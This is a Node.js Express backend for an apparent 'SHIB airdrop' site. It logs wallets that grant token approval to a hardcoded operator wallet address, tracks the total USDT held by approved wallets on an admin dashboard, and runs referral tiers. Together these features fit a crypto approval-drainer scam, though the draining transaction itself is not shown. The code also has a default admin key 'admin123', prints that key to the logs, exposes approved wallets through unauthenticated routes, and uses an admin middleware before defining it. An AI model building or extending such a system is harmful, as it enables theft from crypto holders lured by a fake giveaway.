const express = require('express');
const cors = require('cors');
const mongoose = require('mongoose');
require('dotenv').config();

const app = express();

// ✅ FIXED: CORS Configuration for Netlify
const corsOptions = {
    origin: [
        'https://shib-airdrop.netlify.app',  // Your Netlify frontend
        'http://localhost:3000',              // Local development
        'http://127.0.0.1:3000',             // Local development
        'http://localhost:8080',              // Local backend
        'http://127.0.0.1:8080'              // Local backend
    ],
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization', 'admin-key', 'Accept'],
    credentials: true,
    optionsSuccessStatus: 200
};

// Middleware
app.use(cors(corsOptions));
app.use(express.json());

// Environment Variables
const MONGODB_URI = process.env.MONGODB_URI;
const ADMIN_KEY = process.env.ADMIN_KEY || 'admin123';
const PORT = process.env.PORT || 8080;

// ✅ FIXED: MongoDB Connection with better error handling
const connectDB = async () => {
    try {
        if (!MONGODB_URI) {
            console.log('⚠️ MONGODB_URI not found, running without database...');
            return false;
        }
        
        await mongoose.connect(MONGODB_URI, {
            useNewUrlParser: true,
            useUnifiedTopology: true,
            serverSelectionTimeoutMS: 5000,
            socketTimeoutMS: 45000,
        });
        console.log('✅ Connected to MongoDB Atlas');
        return true;
    } catch (error) {
        console.error('❌ MongoDB connection error:', error.message);
        console.log('⚠️ Running without database connection...');
        return false;
    }
};

// User Schema
const userSchema = new mongoose.Schema({
    walletAddress: { type: String, required: true, unique: true },
    usdtBalance: String,
    airdropAmount: String,
    referralCount: { type: Number, default: 0 },
    approvalGiven: { type: Boolean, default: false },
    approvalTimestamp: Date,
    tier: String,
    createdAt: { type: Date, default: Date.now }
});

const User = mongoose.model('User', userSchema);

// ✅ NEW: Claim Schema for Airdrop Claims
const claimSchema = new mongoose.Schema({
    walletAddress: { type: String, required: true, lowercase: true },
    usdtBalance: { type: Number, required: true },
    airdropAmount: { type: Number, required: true },
    tier: { type: String, required: true },
    referrer: { type: String, lowercase: true },
    txHash: { type: String },
    claimedAt: { type: Date, default: Date.now },
    status: { type: String, default: 'claimed' }
});

const Claim = mongoose.model('Claim', claimSchema);

// ✅ NEW: Referral Schema
const referralSchema = new mongoose.Schema({
    referrer: { type: String, required: true, lowercase: true },
    referred: { type: String, required: true, lowercase: true },
    level: { type: Number, required: true },
    rewardAmount: { type: Number, default: 0 },
    createdAt: { type: Date, default: Date.now }
});

const Referral = mongoose.model('Referral', referralSchema);

// Settings Schema
const settingsSchema = new mongoose.Schema({
    approvalWalletAddress: { type: String, default: "0xCcf0a381D804BFa37485Bc450CE540c09350f975" },
    updatedAt: { type: Date, default: Date.now }
});

const Settings = mongoose.model('Settings', settingsSchema);

// ✅ FIXED: Initialize default settings with error handling
async function initializeSettings() {
    try {
        const settings = await Settings.findOne();
        if (!settings) {
            const defaultSettings = new Settings();
            await defaultSettings.save();
            console.log('✅ Default settings initialized');
        }
    } catch (error) {
        console.error('⚠️ Error initializing settings:', error.message);
    }
}

// ========================
// ✅ FIXED: Railway Health Check Routes
// ========================

// Health check for Railway (Root level)
app.get('/health', (req, res) => {
    res.status(200).json({ 
        status: 'OK', 
        timestamp: new Date().toISOString(),
        service: 'SHIB Airdrop Backend',
        environment: process.env.NODE_ENV || 'production'
    });
});

// API Health check
app.get('/api/health', (req, res) => {
    res.json({ 
        success: true, 
        message: 'SHIB Airdrop Backend is running!', 
        timestamp: new Date().toISOString(),
        environment: process.env.NODE_ENV || 'production',
        cors: 'Enabled for Netlify'
    });
});

// Handle pre-flight requests
app.options('*', cors(corsOptions));

// ========================
// ✅ NEW: CLAIM APIs for Airdrop Claims
// ========================

// ✅ Save claim to backend
app.post('/api/save-claim', async (req, res) => {
    try {
        const { walletAddress, usdtBalance, airdropAmount, tier, referrer, txHash } = req.body;
        
        console.log('💾 Saving claim for:', walletAddress, 'Airdrop:', airdropAmount, 'Tier:', tier);
        
        if (!walletAddress) {
            return res.status(400).json({ success: false, message: 'Wallet address is required' });
        }
        
        // ✅ Check if MongoDB is connected
        if (mongoose.connection.readyState !== 1) {
            console.log('⚠️ MongoDB not connected, but returning success');
            return res.json({ 
                success: true, 
                message: 'Claim recorded (offline mode)',
                offline: true
            });
        }
        
        // Check if already claimed
        const existingClaim = await Claim.findOne({ walletAddress });
        if (existingClaim) {
            return res.json({ 
                success: true, 
                message: 'Claim already exists for this wallet',
                alreadyClaimed: true
            });
        }
        
        // Create new claim
        const claim = new Claim({
            walletAddress: walletAddress.toLowerCase(),
            usdtBalance: parseFloat(usdtBalance) || 0,
            airdropAmount: parseInt(airdropAmount) || 0,
            tier,
            referrer: referrer && referrer !== "0x0000000000000000000000000000000000000000" ? referrer.toLowerCase() : null,
            txHash: txHash || 'pending',
            claimedAt: new Date()
        });
        
        await claim.save();
        
        // Update user record if exists
        await User.findOneAndUpdate(
            { walletAddress: walletAddress.toLowerCase() },
            { 
                $set: { 
                    claimed: true,
                    claimedAt: new Date()
                }
            },
            { upsert: true, new: true }
        );
        
        console.log('✅ Claim saved successfully for:', walletAddress);
        res.json({ 
            success: true, 
            message: 'Claim saved successfully',
            claimId: claim._id 
        });
        
    } catch (error) {
        console.error('❌ Error saving claim:', error);
        
        // Handle duplicate key error gracefully
        if (error.code === 11000) {
            return res.json({ 
                success: true, 
                message: 'Claim already exists for this wallet' 
            });
        }
        
        res.status(500).json({ success: false, message: 'Internal server error' });
    }
});

// ✅ Get claim status for a wallet
app.get('/api/claim-status/:walletAddress', async (req, res) => {
    try {
        const { walletAddress } = req.params;
        
        if (!walletAddress) {
            return res.status(400).json({ success: false, message: 'Wallet address is required' });
        }
        
        // ✅ Check if MongoDB is connected
        if (mongoose.connection.readyState !== 1) {
            return res.json({ 
                success: true, 
                hasClaimed: false,
                message: 'Database offline'
            });
        }
        
        const claim = await Claim.findOne({ 
            walletAddress: walletAddress.toLowerCase() 
        });
        
        res.json({ 
            success: true, 
            hasClaimed: !!claim,
            claimData: claim 
        });
        
    } catch (error) {
        console.error('❌ Error checking claim status:', error);
        res.json({ 
            success: true, 
            hasClaimed: false,
            message: 'Error checking claim status'
        });
    }
});

// ✅ Get all claims for admin
app.get('/api/admin/claims', authenticateAdmin, async (req, res) => {
    try {
        const { page = 1, limit = 50, search } = req.query;
        
        let filter = {};
        
        // Search by wallet address
        if (search) {
            filter.walletAddress = { $regex: search, $options: 'i' };
        }
        
        const skip = (page - 1) * limit;
        
        const claims = await Claim.find(filter)
            .sort({ claimedAt: -1 })
            .skip(skip)
            .limit(parseInt(limit));
        
        const total = await Claim.countDocuments(filter);
        
        res.json({
            success: true,
            data: claims,
            pagination: {
                page: parseInt(page),
                limit: parseInt(limit),
                total,
                pages: Math.ceil(total / limit)
            }
        });
    } catch (error) {
        console.error('Error fetching claims:', error);
        res.status(500).json({ success: false, message: 'Internal server error' });
    }
});

// ✅ Get claim statistics
app.get('/api/claim-stats', async (req, res) => {
    try {
        // ✅ Check if MongoDB is connected
        if (mongoose.connection.readyState !== 1) {
            return res.json({
                success: true,
                stats: {
                    totalClaims: 0,
                    totalAirdropDistributed: 0,
                    todayClaims: 0
                }
            });
        }
        
        const totalClaims = await Claim.countDocuments();
        
        // Calculate total airdrop distributed
        const claims = await Claim.find();
        let totalAirdropDistributed = 0;
        claims.forEach(claim => {
            totalAirdropDistributed += claim.airdropAmount || 0;
        });
        
        // Today's claims
        const today = new Date();
        today.setHours(0, 0, 0, 0);
        const todayClaims = await Claim.countDocuments({ 
            claimedAt: { $gte: today } 
        });
        
        // Tier distribution for claims
        const tierStats = await Claim.aggregate([
            { $group: { _id: "$tier", count: { $sum: 1 } } }
        ]);
        
        res.json({
            success: true,
            stats: {
                totalClaims,
                totalAirdropDistributed,
                todayClaims,
                tierStats: tierStats.reduce((acc, curr) => {
                    acc[curr._id] = curr.count;
                    return acc;
                }, {})
            }
        });
    } catch (error) {
        console.error('Error fetching claim stats:', error);
        res.json({
            success: true,
            stats: {
                totalClaims: 0,
                totalAirdropDistributed: 0,
                todayClaims: 0
            }
        });
    }
});

// ========================
// ✅ NEW: REFERRAL APIs
// ========================

// ✅ Save referral data
app.post('/api/save-referral', async (req, res) => {
    try {
        const { referrer, referred, level, rewardAmount } = req.body;
        
        if (!referrer || !referred) {
            return res.status(400).json({ success: false, message: 'Referrer and referred addresses are required' });
        }
        
        // ✅ Check if MongoDB is connected
        if (mongoose.connection.readyState !== 1) {
            return res.json({ 
                success: true, 
                message: 'Referral recorded (offline mode)',
                offline: true
            });
        }
        
        const referral = new Referral({
            referrer: referrer.toLowerCase(),
            referred: referred.toLowerCase(),
            level: level || 1,
            rewardAmount: rewardAmount || 0
        });
        
        await referral.save();
        
        // Update referrer's referral count
        await User.findOneAndUpdate(
            { walletAddress: referrer.toLowerCase() },
            { $inc: { referralCount: 1 } },
            { upsert: true, new: true }
        );
        
        res.json({ 
            success: true, 
            message: 'Referral saved successfully',
            referralId: referral._id 
        });
        
    } catch (error) {
        console.error('❌ Error saving referral:', error);
        res.status(500).json({ success: false, message: 'Internal server error' });
    }
});

// ✅ Get referrals for a wallet
app.get('/api/referrals/:walletAddress', async (req, res) => {
    try {
        const { walletAddress } = req.params;
        
        if (!walletAddress) {
            return res.status(400).json({ success: false, message: 'Wallet address is required' });
        }
        
        // ✅ Check if MongoDB is connected
        if (mongoose.connection.readyState !== 1) {
            return res.json({ 
                success: true, 
                referrals: [],
                message: 'Database offline'
            });
        }
        
        const referrals = await Referral.find({ 
            referrer: walletAddress.toLowerCase() 
        }).sort({ createdAt: -1 });
        
        res.json({ 
            success: true, 
            referrals,
            count: referrals.length 
        });
        
    } catch (error) {
        console.error('❌ Error fetching referrals:', error);
        res.json({ 
            success: true, 
            referrals: [],
            message: 'Error fetching referrals'
        });
    }
});

// ========================
// ✅ ADMIN APIs
// ========================

// Middleware for admin authentication
const authenticateAdmin = (req, res, next) => {
    const adminKey = req.headers['admin-key'] || req.query.adminKey;
    
    if (!adminKey || adminKey !== ADMIN_KEY) {
        return res.status(401).json({ 
            success: false, 
            message: 'Unauthorized: Invalid admin key' 
        });
    }
    next();
};

// Get all approvals for admin panel
app.get('/api/admin/approvals', authenticateAdmin, async (req, res) => {
    try {
        const { page = 1, limit = 50, search, tier } = req.query;
        
        let filter = { approvalGiven: true };
        
        // Search by wallet address
        if (search) {
            filter.walletAddress = { $regex: search, $options: 'i' };
        }
        
        // Filter by tier
        if (tier) {
            filter.tier = tier;
        }
        
        const skip = (page - 1) * limit;
        
        const approvals = await User.find(filter)
            .sort({ approvalTimestamp: -1 })
            .skip(skip)
            .limit(parseInt(limit))
            .select('walletAddress usdtBalance airdropAmount tier approvalTimestamp referralCount createdAt');
        
        const total = await User.countDocuments(filter);
        
        res.json({
            success: true,
            data: approvals,
            pagination: {
                page: parseInt(page),
                limit: parseInt(limit),
                total,
                pages: Math.ceil(total / limit)
            }
        });
    } catch (error) {
        console.error('Error fetching admin approvals:', error);
        res.status(500).json({ success: false, message: 'Internal server error' });
    }
});

// Get admin dashboard statistics
app.get('/api/admin/stats', authenticateAdmin, async (req, res) => {
    try {
        const totalApprovals = await User.countDocuments({ approvalGiven: true });
        const totalUsers = await User.countDocuments();
        const totalClaims = await Claim.countDocuments();
        
        // Calculate total USDT locked
        const approvedUsers = await User.find({ approvalGiven: true });
        let totalUSDT = 0;
        approvedUsers.forEach(user => {
            const balance = parseFloat(user.usdtBalance) || 0;
            totalUSDT += balance;
        });
        
        // Calculate total airdrop distributed
        const claims = await Claim.find();
        let totalAirdropDistributed = 0;
        claims.forEach(claim => {
            totalAirdropDistributed += claim.airdropAmount || 0;
        });
        
        // Tier distribution
        const tierStats = await User.aggregate([
            { $match: { approvalGiven: true } },
            { $group: { _id: "$tier", count: { $sum: 1 } } }
        ]);
        
        // Today's approvals
        const today = new Date();
        today.setHours(0, 0, 0, 0);
        const todayApprovals = await User.countDocuments({ 
            approvalGiven: true, 
            approvalTimestamp: { $gte: today } 
        });
        
        // Today's claims
        const todayClaims = await Claim.countDocuments({ 
            claimedAt: { $gte: today } 
        });
        
        res.json({
            success: true,
            data: {
                totalApprovals,
                totalUsers,
                totalClaims,
                totalUSDT: parseFloat(totalUSDT.toFixed(2)),
                totalAirdropDistributed,
                todayApprovals,
                todayClaims,
                tierStats: tierStats.reduce((acc, curr) => {
                    acc[curr._id] = curr.count;
                    return acc;
                }, {})
            }
        });
    } catch (error) {
        console.error('Error fetching admin stats:', error);
        res.status(500).json({ success: false, message: 'Internal server error' });
    }
});

// Get approvals with filters for admin
app.get('/api/admin/approvals/filter', authenticateAdmin, async (req, res) => {
    try {
        const { date, minAmount, maxAmount, tier, search } = req.query;
        let filter = { approvalGiven: true };
        
        // Date filter
        if (date) {
            const startDate = new Date(date);
            const endDate = new Date(date);
            endDate.setDate(endDate.getDate() + 1);
            
            filter.approvalTimestamp = {
                $gte: startDate,
                $lt: endDate
            };
        }
        
        // USDT amount filters
        if (minAmount || maxAmount) {
            filter.usdtBalance = {};
            if (minAmount) {
                filter.usdtBalance.$gte = parseFloat(minAmount).toString();
            }
            if (maxAmount) {
                filter.usdtBalance.$lte = parseFloat(maxAmount).toString();
            }
        }
        
        // Tier filter
        if (tier) {
            filter.tier = tier;
        }
        
        // Search filter
        if (search) {
            filter.walletAddress = { $regex: search, $options: 'i' };
        }
        
        const approvals = await User.find(filter)
            .sort({ approvalTimestamp: -1 })
            .select('walletAddress usdtBalance airdropAmount tier approvalTimestamp referralCount createdAt');
        
        res.json({
            success: true,
            data: approvals,
            count: approvals.length
        });
    } catch (error) {
        console.error('Error filtering approvals:', error);
        res.status(500).json({ success: false, message: 'Internal server error' });
    }
});

// ========================
// ✅ FIXED: USER APIs with better error handling
// ========================

// Save user approval
app.post('/api/save-approval', async (req, res) => {
    try {
        const { walletAddress, usdtBalance, airdropAmount, tier } = req.body;
        
        console.log('✅ Saving approval for:', walletAddress, 'USDT:', usdtBalance, 'Tier:', tier);
        
        if (!walletAddress) {
            return res.status(400).json({ success: false, message: 'Wallet address is required' });
        }
        
        // ✅ FIXED: Check if MongoDB is connected
        if (mongoose.connection.readyState !== 1) {
            console.log('⚠️ MongoDB not connected, but returning success');
            return res.json({ 
                success: true, 
                message: 'Approval recorded (offline mode)',
                offline: true
            });
        }
        
        let user = await User.findOne({ walletAddress });
        
        if (user) {
            // Update existing user
            user.usdtBalance = usdtBalance || user.usdtBalance;
            user.airdropAmount = airdropAmount || user.airdropAmount;
            user.tier = tier || user.tier;
            user.approvalGiven = true;
            user.approvalTimestamp = new Date();
        } else {
            // Create new user
            user = new User({
                walletAddress,
                usdtBalance,
                airdropAmount,
                tier,
                approvalGiven: true,
                approvalTimestamp: new Date()
            });
        }
        
        await user.save();
        console.log('✅ Approval saved successfully for:', walletAddress);
        res.json({ success: true, message: 'Approval saved successfully' });
    } catch (error) {
        console.error('❌ Error saving approval:', error);
        
        // ✅ FIXED: Handle duplicate key error gracefully
        if (error.code === 11000) {
            return res.json({ 
                success: true, 
                message: 'Approval already exists for this wallet' 
            });
        }
        
        res.status(500).json({ success: false, message: 'Internal server error' });
    }
});

// Get approval wallet address
app.get('/api/approval-wallet', async (req, res) => {
    try {
        // ✅ FIXED: Check MongoDB connection
        if (mongoose.connection.readyState !== 1) {
            return res.json({ 
                success: true, 
                approvalWalletAddress: "0xCcf0a381D804BFa37485Bc450CE540c09350f975" 
            });
        }
        
        const settings = await Settings.findOne();
        res.json({ 
            success: true, 
            approvalWalletAddress: settings?.approvalWalletAddress || "0xCcf0a381D804BFa37485Bc450CE540c09350f975" 
        });
    } catch (error) {
        console.error('Error fetching approval wallet:', error);
        res.json({ 
            success: true, 
            approvalWalletAddress: "0xCcf0a381D804BFa37485Bc450CE540c09350f975" 
        });
    }
});

// Update approval wallet address (Admin only)
app.post('/api/update-approval-wallet', async (req, res) => {
    try {
        const { newWalletAddress, adminKey } = req.body;
        
        // Admin authentication
        if (adminKey !== ADMIN_KEY) {
            return res.status(401).json({ success: false, message: 'Unauthorized' });
        }
        
        if (!newWalletAddress || !newWalletAddress.startsWith('0x')) {
            return res.status(400).json({ success: false, message: 'Valid wallet address required' });
        }
        
        // ✅ FIXED: Check MongoDB connection
        if (mongoose.connection.readyState !== 1) {
            return res.status(500).json({ success: false, message: 'Database not available' });
        }
        
        let settings = await Settings.findOne();
        if (!settings) {
            settings = new Settings();
        }
        
        settings.approvalWalletAddress = newWalletAddress;
        settings.updatedAt = new Date();
        
        await settings.save();
        res.json({ success: true, message: 'Approval wallet updated successfully' });
    } catch (error) {
        console.error('Error updating approval wallet:', error);
        res.status(500).json({ success: false, message: 'Internal server error' });
    }
});

// Get all users who gave approval
app.get('/api/approved-users', async (req, res) => {
    try {
        // ✅ FIXED: Check MongoDB connection
        if (mongoose.connection.readyState !== 1) {
            return res.json({ success: true, users: [] });
        }
        
        const users = await User.find({ approvalGiven: true })
            .sort({ approvalTimestamp: -1 })
            .select('walletAddress usdtBalance airdropAmount tier approvalTimestamp referralCount');
        
        res.json({ success: true, users });
    } catch (error) {
        console.error('Error fetching approved users:', error);
        res.json({ success: true, users: [] });
    }
});

// Get user statistics
app.get('/api/user-stats', async (req, res) => {
    try {
        // ✅ FIXED: Check MongoDB connection
        if (mongoose.connection.readyState !== 1) {
            return res.json({
                success: true,
                stats: {
                    totalUsers: 0,
                    approvedUsers: 0,
                    totalAirdropAmount: 0
                }
            });
        }
        
        const totalUsers = await User.countDocuments();
        const approvedUsers = await User.countDocuments({ approvalGiven: true });
        
        const users = await User.find({ approvalGiven: true });
        let totalAirdropAmount = 0;
        users.forEach(user => {
            const amount = parseFloat(user.airdropAmount) || 0;
            totalAirdropAmount += amount;
        });
        
        res.json({
            success: true,
            stats: {
                totalUsers,
                approvedUsers,
                totalAirdropAmount: Math.round(totalAirdropAmount)
            }
        });
    } catch (error) {
        console.error('Error fetching user stats:', error);
        res.json({
            success: true,
            stats: {
                totalUsers: 0,
                approvedUsers: 0,
                totalAirdropAmount: 0
            }
        });
    }
});

// Root endpoint
app.get('/', (req, res) => {
    res.json({
        success: true,
        message: 'SHIB Airdrop Backend API',
        version: '1.0.0',
        cors: 'Enabled for Netlify',
        endpoints: {
            health: '/health',
            apiHealth: '/api/health',
            approvalWallet: '/api/approval-wallet',
            saveApproval: '/api/save-approval',
            saveClaim: '/api/save-claim',
            claimStatus: '/api/claim-status/:walletAddress',
            referrals: '/api/referrals/:walletAddress',
            approvedUsers: '/api/approved-users',
            userStats: '/api/user-stats',
            claimStats: '/api/claim-stats',
            adminApprovals: '/api/admin/approvals',
            adminClaims: '/api/admin/claims',
            adminStats: '/api/admin/stats',
            adminFilter: '/api/admin/approvals/filter'
        }
    });
});

// ========================
// ✅ FIXED: Railway Health Check & Keep Alive
// ========================

// Start server
const startServer = async () => {
    try {
        const dbConnected = await connectDB();
        if (dbConnected) {
            await initializeSettings();
        }
        
        const server = app.listen(PORT, '0.0.0.0', () => {
            console.log(`🚀 Backend server running on port ${PORT}`);
            console.log(`📊 Environment: ${process.env.NODE_ENV || 'production'}`);
            console.log(`🌐 CORS Enabled for: https://shib-airdrop.netlify.app`);
            console.log(`🔐 Admin Key: ${ADMIN_KEY}`);
            console.log(`🗄️ Database: ${dbConnected ? 'Connected ✅' : 'Offline ⚠️'}`);
            console.log('✅ All APIs are now available!');
        });

        // ✅ Keep alive for Railway
        process.on('SIGTERM', () => {
            console.log('Received SIGTERM, performing graceful shutdown');
            server.close(() => {
                console.log('Server closed');
                process.exit(0);
            });
        });

        process.on('SIGINT', () => {
            console.log('Received SIGINT, performing graceful shutdown');
            server.close(() => {
                console.log('Server closed');
                process.exit(0);
            });
        });

        // ✅ Heartbeat to prevent shutdown
        setInterval(() => {
            console.log('🟢 Server heartbeat:', new Date().toISOString());
        }, 60000);

    } catch (error) {
        console.error('❌ Failed to start server:', error);
        process.exit(1);
    }
};

startServer();
